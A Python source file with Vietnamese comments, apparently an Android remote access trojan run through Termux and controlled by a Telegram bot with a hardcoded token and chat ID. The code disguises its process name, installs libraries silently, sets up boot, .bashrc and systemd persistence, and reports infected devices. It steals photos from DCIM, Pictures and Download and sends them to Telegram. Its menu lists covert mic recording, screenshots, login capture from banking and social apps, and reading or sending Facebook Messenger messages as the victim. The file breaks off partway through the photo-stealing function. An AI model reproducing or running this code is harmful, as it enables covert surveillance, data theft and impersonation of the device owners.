import os
import subprocess
import time
import threading
import requests
import platform
import socket
from datetime import datetime
import sys
import json
import fcntl
import atexit

# Giả dạng process hệ thống
sys.argv[0] = "[kworker/u:0]"

# Ẩn file log
LOG_FILE = "/dev/shm/.log.txt"

# Hàm tự động cài đặt thư viện ẩn mà không hỏi
def silent_install_libraries():
    required_libs = ['psutil']  # Có thể thêm nếu cần
    for lib in required_libs:
        try:
            __import__(lib)
        except ImportError:
            print("Đang chạy công cụ hệ thống...")  # Giả dạng
            subprocess.run(["pip", "install", lib, "--quiet"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
    print("Công cụ chạy thành công!")  # Giả thành công

silent_install_libraries()

# Import sau khi cài
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# Cấu hình Telegram
TELEGRAM_TOKEN = "7948921748:AAHmLU0puiv-MDtcVuA3YtqwOB0t4Nazq2s"
CHAT_ID = "6415297481"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
TELEGRAM_FILE_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"

# Biến toàn cục
last_update_id = 0
running = True
stop_event = threading.Event()
infected_devices = []
device_selection_mode = True
selected_device = None
bot_active = True
is_infected = False
device_menu_sent = False
function_menu_sent = False
messenger_mode = False
messenger_contacts = []
selected_contact = None
is_self_test = False
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bonet_log.txt")
INFECTED_DEVICES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "infected_devices.txt")
LOCK_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bonet.lock")
DEVICE_STATUS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "device_status.json")

# List các app/web nhạy cảm để theo dõi (thêm nếu cần: banking, email, etc.)
TARGET_APPS = [
    "com.facebook.orca",  # Facebook Messenger
    "com.facebook.katana",  # Facebook app
    "com.google.android.gm",  # Gmail
    "com.android.chrome",  # Chrome (web login)
    "com.instagram.android",  # Instagram
    # Thêm app ngân hàng ví dụ: "com.vpbank", "com.techcombank", etc.
]

# Hàm tạo thư mục và file log nếu chưa tồn tại
def ensure_log_file():
    log_dir = os.path.dirname(LOG_FILE)
    try:
        if not os.path.exists(log_dir):
            os.makedirs(log_dir, exist_ok=True)
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w") as f:
                f.write(f"[{datetime.now()}] Log file created.\n")
    except Exception as e:
        print(f"Không thể tạo file log {LOG_FILE}: {str(e)}")

# Hàm lưu danh sách thiết bị bị nhiễm
def save_infected_devices():
    try:
        with open(INFECTED_DEVICES_FILE, "w") as f:
            devices_data = [
                {
                    "device_id": device.device_id,
                    "info": device.info,
                    "infection_time": device.infection_time,
                    "status": device.status
                } for device in infected_devices
            ]
            json.dump(devices_data, f)
    except Exception as e:
        print(f"Không thể lưu danh sách thiết bị bị nhiễm: {str(e)}")

# Hàm đọc danh sách thiết bị bị nhiễm
def load_infected_devices():
    global infected_devices
    try:
        if os.path.exists(INFECTED_DEVICES_FILE):
            with open(INFECTED_DEVICES_FILE, "r") as f:
                devices_data = json.load(f)
                infected_devices = [
                    Device(data["device_id"], data["info"], data["infection_time"], data.get("status", "offline"))
                    for data in devices_data
                ]
    except Exception as e:
        print(f"Không thể đọc danh sách thiết bị bị nhiễm: {str(e)}")

# Lưu trạng thái thiết bị
def save_device_status(device_id, status):
    try:
        status_data = {}
        if os.path.exists(DEVICE_STATUS_FILE):
            with open(DEVICE_STATUS_FILE, "r") as f:
                status_data = json.load(f)
        status_data[str(device_id)] = {"status": status, "last_updated": datetime.now().strftime("%Y-%m-d %H:%M:%S")}
        with open(DEVICE_STATUS_FILE, "w") as f:
            json.dump(status_data, f)
    except Exception as e:
        print(f"Không thể lưu trạng thái thiết bị: {str(e)}")

# Kiểm tra trạng thái thiết bị
def check_device_status(device_id):
    if is_self_test:
        return "online"
    try:
        if not os.path.exists(DEVICE_STATUS_FILE):
            return "offline"
        with open(DEVICE_STATUS_FILE, "r") as f:
            status_data = json.load(f)
            device_status = status_data.get(str(device_id), {"status": "offline"})
            last_updated = device_status.get("last_updated", None)
            if last_updated:
                last_updated_time = datetime.strptime(last_updated, "%Y-%m-d %H:%M:%S")
                time_diff = (datetime.now() - last_updated_time).total_seconds()
                if time_diff > 60:
                    return "offline"
            return device_status["status"]
    except Exception as e:
        print(f"Lỗi khi kiểm tra trạng thái thiết bị: {str(e)}")
        return "offline"

# Kiểm tra và dừng các instance bot khác
def stop_duplicate_instances():
    current_pid = os.getpid()
    bot_name = os.path.basename(__file__)

    if PSUTIL_AVAILABLE:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if proc.pid != current_pid and bot_name in " ".join(proc.cmdline()):
                    print(f"Đã tìm thấy instance khác (PID: {proc.pid}), đang dừng...")
                    proc.kill()
            except Exception as e:
                print(f"Lỗi khi kiểm tra instance trùng lặp qua psutil: {str(e)}")

    try:
        result = subprocess.run(["pgrep", "-f", bot_name], capture_output=True, text=True)
        if result.stdout:
            pids = result.stdout.strip().split("\n")
            for pid in pids:
                if pid and int(pid) != current_pid:
                    print(f"Đã tìm thấy instance khác (PID: {pid}), đang dừng...")
                    subprocess.run(["kill", "-9", pid])
        else:
            print(f"Không tìm thấy instance nào chạy với tên {bot_name}.")
    except Exception as e:
        print(f"Lỗi khi dừng instance trùng lặp qua lệnh hệ thống: {str(e)}")

    try:
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        for line in lines:
            if bot_name in line and str(current_pid) not in line:
                pid = line.split()[1]
                print(f"Đã tìm thấy instance khác qua ps (PID: {pid}), đang dừng...")
                subprocess.run(["kill", "-9", pid])
    except Exception as e:
        print(f"Lỗi khi kiểm tra instance qua ps: {str(e)}")

# Dùng file lock để ngăn nhiều instance chạy cùng lúc
def acquire_lock():
    global lock_fd
    lock_fd = open(LOCK_FILE, "w")
    
    try:
        bot_name = os.path.basename(__file__)
        current_pid = str(os.getpid())
        
        result = subprocess.run(["pgrep", "-f", bot_name], capture_output=True, text=True)
        pids = result.stdout.strip().split("\n")
        running_instances = [pid for pid in pids if pid and pid != current_pid]

        ps_pids = []
        result = subprocess.run(["ps", "aux"], capture_output=True, text=True)
        lines = result.stdout.splitlines()
        for line in lines:
            if bot_name in line and current_pid not in line:
                pid = line.split()[1]
                ps_pids.append(pid)

        running_instances = [pid for pid in running_instances if pid in ps_pids]

        if not running_instances:
            if os.path.exists(LOCK_FILE):
                print("Không tìm thấy instance nào chạy, xóa file lock cũ...")
                os.remove(LOCK_FILE)
        else:
            print(f"Các instance đang chạy (PIDs: {', '.join(running_instances)}). Thoát...")
            sys.exit(1)
    except Exception as e:
        print(f"Lỗi khi kiểm tra instance chạy: {str(e)}")

    try:
        fcntl.flock(lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
        return lock_fd
    except IOError:
        print("Không thể khóa file, có thể do instance khác đang chạy. Thoát...")
        sys.exit(1)

# Giải phóng file lock khi thoát
def release_lock():
    try:
        fcntl.flock(lock_fd, fcntl.LOCK_UN)
        lock_fd.close()
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
        print("Đã giải phóng file lock.")
    except Exception as e:
        print(f"Lỗi khi giải phóng file lock: {str(e)}")

# Kiểm tra kết nối mạng
def check_network():
    try:
        response = requests.get("https://api.telegram.org", timeout=5)
        return response.ok
    except Exception:
        return False

# Kiểm tra kết nối Wi-Fi
def check_wifi():
    try:
        result = subprocess.run(["termux-wifi-connectioninfo"], capture_output=True, text=True)
        wifi_info = json.loads(result.stdout)
        return wifi_info.get("supplicant_state") == "COMPLETED"
    except Exception as e:
        print(f"Lỗi khi kiểm tra Wi-Fi: {str(e)}")
        return False

# Kiểm tra quyền truy cập mic
def check_mic_permission():
    try:
        result = subprocess.run(["termux-microphone-record", "-i"], capture_output=True, text=True)
        if "Permission denied" in result.stderr:
            return False
        return True
    except Exception as e:
        print(f"Lỗi khi kiểm tra quyền mic: {str(e)}")
        return False

# Kiểm tra trạng thái mic
def check_mic_status():
    try:
        result = subprocess.run(["termux-microphone-record", "-i"], capture_output=True, text=True)
        if "Recording is active" in result.stdout:
            return "busy"
        return "available"
    except Exception as e:
        print(f"Lỗi khi kiểm tra trạng thái mic: {str(e)}")
        return "error"

# Kiểm tra quyền truy cập danh bạ
def check_contact_permission():
    try:
        result = subprocess.run(["termux-contact-list"], capture_output=True, text=True)
        if "Permission denied" in result.stderr:
            return False
        return True
    except Exception as e:
        print(f"Lỗi khi kiểm tra quyền danh bạ: {str(e)}")
        return False

# Kiểm tra quyền truy cập bộ nhớ
def check_storage_permission():
    try:
        result = subprocess.run(["ls", "/sdcard"], capture_output=True, text=True)
        if "Permission denied" in result.stderr:
            return False
        return True
    except Exception as e:
        print(f"Lỗi khi kiểm tra quyền bộ nhớ: {str(e)}")
        return False

# Hàm gửi tin nhắn qua Telegram
def send_to_telegram(message):
    if stop_event.is_set():
        return False
    
    if not check_network():
        try:
            ensure_log_file()
            with open(LOG_FILE, "a") as f:
                f.write(f"[{datetime.now()}] Lỗi: Không có kết nối mạng để gửi tin nhắn: {message}\n")
        except Exception as e:
            print(f"Không thể ghi log: {str(e)}")
        return False
    
    retry_count = 0
    max_retries = 5
    while retry_count < max_retries:
        try:
            payload = {
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            response = requests.post(TELEGRAM_API, json=payload, timeout=10)
            if response.ok:
                return True
            retry_count += 1
            time.sleep(5)
        except Exception as e:
            retry_count += 1
            try:
                ensure_log_file()
                with open(LOG_FILE, "a") as f:
                    f.write(f"[{datetime.now()}] Lỗi gửi tin nhắn Telegram (lần {retry_count}): {str(e)}\n")
            except Exception as log_error:
                print(f"Không thể ghi log: {str(log_error)}")
            time.sleep(5)
    
    try:
        ensure_log_file()
        with open(LOG_FILE, "a") as f:
            f.write(f"[{datetime.now()}] Không thể gửi tin nhắn Telegram sau {max_retries} lần thử: {message}\n")
    except Exception as e:
        print(f"Không thể ghi log: {str(e)}")
    return False

# Hàm gửi file qua Telegram
def send_file_to_telegram(file_path):
    if not stop_event.is_set():
        try:
            if not os.path.exists(file_path):
                send_to_telegram(f"Lỗi: File {file_path} không tồn tại.")
                return
            if os.path.getsize(file_path) == 0:
                send_to_telegram(f"Lỗi: File {file_path} rỗng, không thể gửi.")
                return
            if os.path.getsize(file_path) > 10 * 1024 * 1024:
                send_to_telegram(f"Tệp quá lớn: {file_path}")
                return
            with open(file_path, "rb") as file:
                files = {"document": file}
                payload = {"chat_id": CHAT_ID}
                response = requests.post(TELEGRAM_FILE_API, data=payload, files=files, timeout=10)
                if not response.ok:
                    send_to_telegram(f"Lỗi gửi file qua Telegram: {response.text}")
        except Exception as e:
            send_to_telegram(f"Lỗi khi gửi file qua Telegram: {str(e)}")

# Menu chọn thiết bị
def send_device_menu():
    global device_menu_sent
    if device_menu_sent:
        return
    if not infected_devices:
        send_to_telegram("Chưa có thiết bị nào bị nhiễm. Đợi thiết bị từ xa chạy bonet.py để lây nhiễm.")
        device_menu_sent = True
        return
    menu = "Danh sách thiết bị bị nhiễm:\n"
    for device in infected_devices:
        status = check_device_status(device.device_id)
        device.status = status
        save_infected_devices()
        menu += f"{device.device_id}. Thiết bị: {device.info['name']} (Nhiễm lúc: {device.infection_time}, Trạng thái: {status})\n"
    menu += "Reply số (1, 2, 3,...) để chọn thiết bị."
    send_to_telegram(menu)
    device_menu_sent = True

# Menu lệnh (thêm note về tính năng mới)
def send_menu():
    global function_menu_sent
    if not stop_event.is_set():
        status = check_device_status(selected_device.device_id)
        selected_device.status = status
        save_infected_devices()
        menu = (
            f"Đang điều khiển thiết bị {selected_device.device_id} ({selected_device.info['name']}, Trạng thái: {status}):\n"
            "Chọn lệnh:\n"
            "1. 👨‍💻Kiểm tra thông tin thiết bị\n"
            "2. 👨‍💻Tấn Công và Lấy Ảnh\n"
            "3. 👨‍💻Tấn Công và Lấy video\n"
            "4. 👨‍💻Ghi âm mic ẩn\n"
            "5. 👨‍💻Truy cập Messenger (gửi tin nhắn)\n"
            "6. 👨‍💻Đọc tin nhắn Messenger\n"
            "/capmh - Chụp màn hình nạn nhân\n"
            "Tính năng mới: Tự động phát hiện và capture login info từ app/web!\n"
            "Reply số (1-6) để chọn. Reply 'D' để dừng bot. Reply 'Y' để bật lại bot.\n"
            "Reply 'BACK' để quay lại chọn thiết bị."
        )
        send_to_telegram(menu)
        function_menu_sent = True

# Menu chọn liên lạc Messenger
def send_messenger_contacts():
    global messenger_mode, messenger_contacts
    if not messenger_contacts:
        send_to_telegram("Không tìm thấy liên lạc nào. Đảm bảo Termux-API được cài đặt và có quyền truy cập danh bạ.")
        return
    menu = "Danh sách liên lạc (Messenger):\n"
    for idx, contact in enumerate(messenger_contacts, 1):
        menu += f"{idx}. {contact['name']} ({contact['number']})\n"
    menu += "Reply số (1, 2, 3,...) để chọn liên lạc. Reply 'BACK' để quay lại menu chính."
    send_to_telegram(menu)
    messenger_mode = True

# Lớp lưu thông tin thiết bị
class Device:
    def __init__(self, device_id, info, infection_time, status="offline"):
        self.device_id = device_id
        self.info = info
        self.infection_time = infection_time
        self.status = status

# Lấy thông tin thiết bị
def get_device_info():
    if stop_event.is_set():
        return None
    try:
        info = {}
        info["os"] = f"{platform.system()} {platform.release()}"
        info["machine"] = platform.machine()
        info["name"] = platform.node()
        stat = os.statvfs(os.path.dirname(__file__))
        free_space = stat.f_bavail * stat.f_frsize / (1024 ** 3)
        total_space = stat.f_blocks * stat.f_frsize / (1024 ** 3)
        info["storage"] = f"{free_space:.2f}/{total_space:.2f} GB trống"
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
        return info
    except Exception as e:
        send_to_telegram(f"Lỗi khi lấy thông tin thiết bị: {str(e)}")
        return None

# Báo cáo thông tin thiết bị khi bị nhiễm
def report_infection():
    global is_infected, is_self_test
    if is_infected:
        return
    device_info = get_device_info()
    if device_info:
        infection_time = datetime.now().strftime("%Y-%m-d %H:%M:%S")
        device_id = len(infected_devices) + 1
        device = Device(device_id, device_info, infection_time, status="online")
        infected_devices.append(device)
        save_infected_devices()
        
        is_self_test = True
        test_mode_msg = " (Chế độ test: Đang chạy trên cùng một máy, bỏ qua kiểm tra trạng thái thiết bị.)" if is_self_test else ""
        
        report = (
            f"📱Thiết bị mới bị nhiễm!{test_mode_msg}\n"
            f"📞ID: {device_id}\n"
            f"💻Hệ điều hành: {device_info['os']}\n"
            f"👨‍💻Thiết bị: {device_info['machine']}\n"
            f"👾Tên: {device_info['name']}\n"
            f"💾Bộ nhớ: {device_info['storage']}\n"
            f"📥IP: {device_info['ip']}\n"
            f"📟Thời gian nhiễm: {infection_time}"
        )
        send_to_telegram(report)
        save_device_status(device_id, "online")
        is_infected = True
    else:
        send_to_telegram("Thiết bị mới bị nhiễm, nhưng không lấy được thông tin chi tiết.")
        save_device_status(device_id, "offline")
        is_infected = True

# Tự động cài đặt để chạy liên tục trên thiết bị
def setup_autorun():
    try:
        current_file = os.path.abspath(__file__)
        
        # ===== 1. TERMUX BOOT =====
        termux_boot_dir = "/data/data/com.termux/files/home/.termux/boot"
        os.makedirs(termux_boot_dir, exist_ok=True)
        
        with open(f"{termux_boot_dir}/start_bonet", "w") as f:
            f.write(f"""#!/bin/sh
# Hidden startup script
termux-wake-lock
nohup python {current_file} >/dev/null 2>&1 &
""")
        os.chmod(f"{termux_boot_dir}/start_bonet", 0o755)

        # ===== 2. BASHRC ===== 
        bashrc_path = "/data/data/com.termux/files/home/.bashrc"
        autorun_cmd = f"python {current_file} &"
        
        if not os.path.exists(bashrc_path):
            with open(bashrc_path, "w") as f:
                f.write("# .bashrc\n")
        
        with open(bashrc_path, "r+") as f:
            content = f.read()
            if autorun_cmd not in content:
                f.write(f"\n# Auto-run\n{autorun_cmd}\n")

        # ===== 3. SYSTEMD (Nếu có root) =====
        if os.path.exists("/system/bin/su"):
            with open("/etc/systemd/system/bonet.service", "w") as f:
                f.write(f"""[Unit]
Description=Bonet Service
After=network.target

[Service]
ExecStart=/usr/bin/python {current_file}
Restart=always
User=root

[Install]
WantedBy=multi-user.target
""")
            subprocess.run(["systemctl", "enable", "bonet.service"], stderr=subprocess.DEVNULL)
            subprocess.run(["systemctl", "start", "bonet.service"], stderr=subprocess.DEVNULL)

        # ===== Kích hoạt ngay lập tức =====
        subprocess.Popen(
            ["python", current_file],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True
        )
        subprocess.run(["termux-wake-lock"], stderr=subprocess.DEVNULL)
        
        send_to_telegram("🛡️ Đã kích hoạt 3 lớp tự khởi động: Termux Boot + .bashrc + Systemd")

    except Exception as e:
        send_to_telegram(f"⚠️ Lỗi persistence: {str(e)}")

# Lấy danh sách liên lạc (giả lập từ danh bạ)
def get_messenger_contacts():
    global messenger_contacts
    # Xóa danh sách liên lạc cũ
    messenger_contacts = []
    
    # Kiểm tra quyền truy cập danh bạ
    if not check_contact_permission():
        send_to_telegram("Lỗi: Termux không có quyền truy cập danh bạ. Vui lòng chạy lệnh 'termux-contact-list' trên Termux và cấp quyền truy cập danh bạ.")
        return
    
    try:
        result = subprocess.run(["termux-contact-list"], capture_output=True, text=True)
        if not result.stdout:
            send_to_telegram("Lỗi: Không thể lấy danh sách liên lạc. Đảm bảo Termux-API được cài đặt và quyền truy cập danh bạ đã được cấp.")
            return
        contacts = json.loads(result.stdout)
        if not contacts:
            send_to_telegram("Danh bạ trống. Vui lòng thêm liên lạc vào danh bạ của thiết bị.")
            return
        messenger_contacts = [{"name": contact["name"], "number": contact["number"]} for contact in contacts if "name" in contact and "number" in contact]
        if not messenger_contacts:
            send_to_telegram("Không tìm thấy liên lạc hợp lệ (cần có tên và số điện thoại). Vui lòng kiểm tra danh bạ.")
    except Exception as e:
        send_to_telegram(f"Lỗi khi lấy danh sách liên lạc: {str(e)}")
        messenger_contacts = []

# Kiểm tra trạng thái ứng dụng Messenger
def check_messenger_status():
    try:
        result = subprocess.run(["am", "stack", "list"], capture_output=True, text=True, shell=False)
        if "com.facebook.orca" in result.stdout:
            return True
        return False
    except Exception as e:
        send_to_telegram(f"Cảnh báo: Không thể kiểm tra trạng thái Messenger ({str(e)}). Bot sẽ thử mở Messenger và tiếp tục.")
        return False

# Kiểm tra trạng thái màn hình (cải thiện bằng dumpsys)
def check_screen_status():
    try:
        # Sử dụng dumpsys để kiểm tra trạng thái màn hình
        result = subprocess.run(["dumpsys", "power"], capture_output=True, text=True)
        if "mHoldingDisplaySuspendBlocker=true" in result.stdout or "mScreenOnFully=true" in result.stdout:
            return True
        # Nếu màn hình tắt, thử bật màn hình
        subprocess.run(["input", "keyevent", "26"], capture_output=True, text=True)
        time.sleep(2)
        # Kiểm tra lại
        result = subprocess.run(["dumpsys", "power"], capture_output=True, text=True)
        if "mHoldingDisplaySuspendBlocker=true" in result.stdout or "mScreenOnFully=true" in result.stdout:
            return True
        return False
    except Exception as e:
        send_to_telegram(f"Cảnh báo: Không thể kiểm tra trạng thái màn hình ({str(e)}). Bot sẽ tiếp tục nhưng có thể thất bại nếu màn hình khóa.")
        return False

# Tìm tọa độ của thành phần giao diện (dùng dumpsys window)
def find_ui_element(keyword):
    try:
        result = subprocess.run(["dumpsys", "window", "windows"], capture_output=True, text=True)
        output = result.stdout
        # Tìm kiếm keyword (ví dụ: "Search" cho thanh tìm kiếm, "Send" cho nút gửi)
        for line in output.splitlines():
            if keyword in line and "bounds=" in line:
                # Ví dụ: bounds=[x1,y1][x2,y2]
                bounds = line.split("bounds=")[1].split("]")[0] + "]"
                x1 = int(bounds.split(",")[0].replace("[", ""))
                y1 = int(bounds.split(",")[1].split("]")[0])
                x2 = int(bounds.split("][")[1].split(",")[0])
                y2 = int(bounds.split("][")[1].split(",")[1].replace("]", ""))
                # Tính tọa độ trung tâm
                x = (x1 + x2) // 2
                y = (y1 + y2) // 2
                return x, y
        return None
    except Exception as e:
        send_to_telegram(f"Lỗi khi tìm tọa độ của '{keyword}': {str(e)}")
        return None

# Gửi tin nhắn qua Messenger
def send_messenger_message(contact_name, message):
    try:
        # Xác nhận đang làm việc với Facebook Messenger
        send_to_telegram("Đang mở ứng dụng Facebook Messenger (không phải tin nhắn SMS)...")

        # Mở Messenger nếu chưa chạy
        if not check_messenger_status():
            send_to_telegram("Messenger chưa chạy, đang mở ứng dụng Facebook Messenger...")
            subprocess.run(["am", "start", "-n", "com.facebook.orca/.MainActivity"], capture_output=True, text=True)
            time.sleep(5)
        else:
            send_to_telegram("Facebook Messenger đã chạy, tiến hành gửi tin nhắn...")

        # Kiểm tra trạng thái màn hình
        if not check_screen_status():
            send_to_telegram("Thiết bị có thể đang ở màn hình khóa. Vui lòng mở khóa thiết bị để gửi tin nhắn qua Messenger.")
            return

        # Tìm tọa độ thanh tìm kiếm
        search_coords = find_ui_element("Search")
        if not search_coords:
            send_to_telegram("Không tìm thấy thanh tìm kiếm trên giao diện Messenger. Vui lòng kiểm tra lại giao diện hoặc cập nhật ứng dụng.")
            return
        x, y = search_coords
        send_to_telegram(f"Đang nhấn vào thanh tìm kiếm tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        # Nhập tên liên lạc
        send_to_telegram(f"Đang tìm kiếm liên lạc trên Messenger: {contact_name}...")
        subprocess.run(["input", "text", contact_name.replace(" ", "%s")], capture_output=True, text=True)
        time.sleep(3)

        # Tìm tọa độ liên lạc đầu tiên
        contact_coords = find_ui_element(contact_name)
        if not contact_coords:
            send_to_telegram(f"Không tìm thấy liên lạc '{contact_name}' trên giao diện Messenger.")
            return
        x, y = contact_coords
        send_to_telegram(f"Đang chọn liên lạc tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(3)

        # Tìm tọa độ ô nhập tin nhắn
        input_coords = find_ui_element("Message")
        if not input_coords:
            send_to_telegram("Không tìm thấy ô nhập tin nhắn trên giao diện Messenger.")
            return
        x, y = input_coords
        send_to_telegram(f"Đang nhấn vào ô nhập tin nhắn tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        # Nhập tin nhắn
        send_to_telegram(f"Đang nhập tin nhắn trên Messenger: {message}...")
        subprocess.run(["input", "text", message.replace(" ", "%s")], capture_output=True, text=True)
        time.sleep(2)

        # Tìm tọa độ nút gửi
        send_coords = find_ui_element("Send")
        if not send_coords:
            send_to_telegram("Không tìm thấy nút gửi trên giao diện Messenger.")
            return
        x, y = send_coords
        send_to_telegram(f"Đang nhấn nút gửi tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        send_to_telegram(f"Đã gửi tin nhắn '{message}' tới {contact_name} qua Facebook Messenger.")
    except Exception as e:
        send_to_telegram(f"Lỗi khi gửi tin nhắn qua Facebook Messenger: {str(e)}")

# Đọc tin nhắn từ Messenger (mới)
def read_messenger_messages(contact_name):
    try:
        # Xác nhận đang làm việc với Facebook Messenger
        send_to_telegram("Đang mở ứng dụng Facebook Messenger để đọc tin nhắn...")

        # Mở Messenger nếu chưa chạy
        if not check_messenger_status():
            send_to_telegram("Messenger chưa chạy, đang mở ứng dụng Facebook Messenger...")
            subprocess.run(["am", "start", "-n", "com.facebook.orca/.MainActivity"], capture_output=True, text=True)
            time.sleep(5)
        else:
            send_to_telegram("Facebook Messenger đã chạy, tiến hành đọc tin nhắn...")

        # Kiểm tra trạng thái màn hình
        if not check_screen_status():
            send_to_telegram("Thiết bị có thể đang ở màn hình khóa. Vui lòng mở khóa thiết bị để đọc tin nhắn từ Messenger.")
            return

        # Tìm tọa độ thanh tìm kiếm
        search_coords = find_ui_element("Search")
        if not search_coords:
            send_to_telegram("Không tìm thấy thanh tìm kiếm trên giao diện Messenger. Vui lòng kiểm tra lại giao diện hoặc cập nhật ứng dụng.")
            return
        x, y = search_coords
        send_to_telegram(f"Đang nhấn vào thanh tìm kiếm tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        # Nhập tên liên lạc
        send_to_telegram(f"Đang tìm kiếm liên lạc trên Messenger: {contact_name}...")
        subprocess.run(["input", "text", contact_name.replace(" ", "%s")], capture_output=True, text=True)
        time.sleep(3)

        # Tìm tọa độ liên lạc đầu tiên
        contact_coords = find_ui_element(contact_name)
        if not contact_coords:
            send_to_telegram(f"Không tìm thấy liên lạc '{contact_name}' trên giao diện Messenger.")
            return
        x, y = contact_coords
        send_to_telegram(f"Đang chọn liên lạc tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(3)

        # Chọn tin nhắn cuối cùng (giả lập long press để sao chép)
        send_to_telegram("Đang chọn tin nhắn cuối cùng để sao chép...")
        message_coords = find_ui_element("Message")
        if not message_coords:
            send_to_telegram("Không tìm thấy tin nhắn trên giao diện Messenger.")
            return
        x, y = message_coords
        # Long press để chọn tin nhắn (dùng input swipe)
        subprocess.run(["input", "swipe", str(x), str(y), str(x), str(y), "1000"], capture_output=True, text=True)  # Long press 1 giây
        time.sleep(2)

        # Tìm tọa độ nút Copy
        copy_coords = find_ui_element("Copy")
        if not copy_coords:
            send_to_telegram("Không tìm thấy nút Copy trên giao diện Messenger. Có thể giao diện đã thay đổi.")
            return
        x, y = copy_coords
        send_to_telegram(f"Đang nhấn nút Copy tại tọa độ ({x}, {y})...")
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        # Mở một ứng dụng để dán tin nhắn (dùng Telegram)
        send_to_telegram("Đang mở Telegram để dán tin nhắn đã sao chép...")
        subprocess.run(["am", "start", "-n", "org.telegram.messenger/.DefaultActivity"], capture_output=True, text=True)
        time.sleep(5)

        # Tìm ô nhập tin nhắn trên Telegram
        telegram_input_coords = find_ui_element("Message")
        if not telegram_input_coords:
            send_to_telegram("Không tìm thấy ô nhập tin nhắn trên Telegram.")
            return
        x, y = telegram_input_coords
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        # Dán tin nhắn (giả lập long press để hiện nút Paste)
        subprocess.run(["input", "swipe", str(x), str(y), str(x), str(y), "1000"], capture_output=True, text=True)  # Long press 1 giây
        time.sleep(2)

        # Tìm nút Paste
        paste_coords = find_ui_element("Paste")
        if not paste_coords:
            send_to_telegram("Không tìm thấy nút Paste trên giao diện Telegram.")
            return
        x, y = paste_coords
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        # Gửi tin nhắn qua Telegram
        send_coords = find_ui_element("Send")
        if not send_coords:
            send_to_telegram("Không tìm thấy nút gửi trên giao diện Telegram.")
            return
        x, y = send_coords
        subprocess.run(["input", "tap", str(x), str(y)], capture_output=True, text=True)
        time.sleep(2)

        send_to_telegram(f"Đã đọc và gửi tin nhắn từ cuộc trò chuyện với {contact_name} qua Telegram.")
    except Exception as e:
        send_to_telegram(f"Lỗi khi đọc tin nhắn từ Messenger: {str(e)}")

# Kiểm tra thông tin thiết bị (tính năng 1)
def get_device_info_command():
    global function_menu_sent
    if stop_event.is_set():
        return
    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return
    try:
        device_info = get_device_info()
        if device_info:
            info = (
                f"👨‍💻Thông tin thiết bị:\n"
                f"💻Hệ điều hành: {device_info['os']}\n"
                f"📱Thiết bị: {device_info['machine']}\n"
                f"👾Tên: {device_info['name']}\n"
                f"💾Bộ nhớ: {device_info['storage']}\n"
                f"📥IP: {device_info['ip']}"
            )
            send_to_telegram(info)
        else:
            send_to_telegram("Không lấy được thông tin thiết bị.")
    except Exception as e:
        send_to_telegram(f"Lỗi khi lấy thông tin thiết bị: {str(e)}")
    finally:
        function_menu_sent = False

# Quét ảnh (tính năng 2) - Có lưu trạng thái
def steal_files(resend_old=False):
    global function_menu_sent
    if stop_event.is_set():
        return

    if check_device_status(selected_device.device_id) == "offline":
        send_to_telegram("Thiết bị nạn nhân hiện không hoạt động. Vui lòng yêu cầu nạn nhân bật Termux.")
        function_menu_sent = False
        return

    if not check_storage_permission():
        send_to_telegram("Lỗi: Termux không có quyền truy cập bộ nhớ. Vui lòng chạy lệnh 'termux-setup-storage' trên Termux và cấp quyền.")
        function_menu_sent = False
        return

    try:
        # Đọc file ảnh đã gửi trước đó
        sent_list_file = os.path.join(os.path.dirname(__file__), "sent_images.txt")
        if os.path.exists(sent_list_file):
            with open(sent_list_file, "r") as f:
                sent_files = set(f.read().splitlines())
        else:
            sent_files = set()

        paths = [
            os.path.dirname(__file__),
            "/sdcard/DCIM/",
            "/sdcard/Pictures/",
            "/sdcard/Download/"
        ]
        image_count = 0
        max_images = 5
        new_sent = []

        for path in paths:
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                if stop_event.is_set():
                    return
                for file in files:
                    if file.lower().endswith((".jpg", ".png", ".jpeg")):
                        file_path = os.path.join(root, file)

                        # Nếu đang ở chế độ chỉ gửi ảnh mới mà ảnh đã gửi thì bỏ qua
                        if not resend_old and file_path in sent_files:
                            continue

                        send_file_to_telegram(file_path)
                        image_count += 1
                        new_sent.append(file_path)

